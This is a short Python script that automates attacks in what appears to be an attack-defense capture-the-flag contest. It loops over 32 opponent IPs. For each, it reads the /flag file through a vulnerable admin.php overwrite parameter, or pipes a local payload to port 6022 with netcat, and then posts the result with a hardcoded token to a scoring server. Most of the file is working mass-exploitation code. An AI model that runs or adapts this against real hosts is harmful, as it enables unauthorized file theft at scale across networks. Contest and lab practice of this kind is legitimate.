import requests
import os
import subprocess
import time
import re
z=['172.20.5.1', '172.20.5.2', '172.20.5.3', '172.20.5.4', '172.20.5.5', '172.20.5.6', '172.20.5.7', '172.20.5.8', '172.20.5.9', '172.20.5.10', '172.20.5.11', '172.20.5.12', '172.20.5.13', '172.20.5.14', '172.20.5.15', '172.20.5.16', '172.20.5.17', '172.20.5.18', '172.20.5.19', '172.20.5.20', '172.20.5.21', '172.20.5.22', '172.20.5.23', '172.20.5.24', '172.20.5.25', '172.20.5.26', '172.20.5.27', '172.20.5.28', '172.20.5.29', '172.20.5.30', '172.20.5.31', '172.20.5.32']

def get_flag(address):
    proc = os.popen("curl http://%s:6024/admin.php?overwrite=/flag" % address)
    time.sleep(0.5)
    content = proc.read()
#     print(content)
    return content
def get_flag2(address):
        proc = os.popen("cat log|nc %s 6022" %address)
        time.sleep(0.5)
        content = proc.read()
        return content
def push_flag(flag,address):
    time.sleep(1)
    proc = os.popen('curl -X POST "https://172.20.1.1/Common/awd_sub_answer" -d "answer=%s&token=76a3ea4740d4735054c13912f810b602" -k' % (flag))
    content = proc.read()
    print(content)


# for i in z:
#     a=get_flag(i)
#     if a.find("-"):
#         # print(a)
#         q=a.split("\n")
#         # print(q)
#         if q:
#                 if q[0].find("-"):
#                         print(q[0])
#                         push_flag(q[0],1)
#         print("==")

for i in z:
        a=get_flag2(i)
        push_flag(a,1)
#     push_flag(a,1)
#     if a:
#         flag = "%s" % a
#         print(flag)
#         push_flag(flag,1)
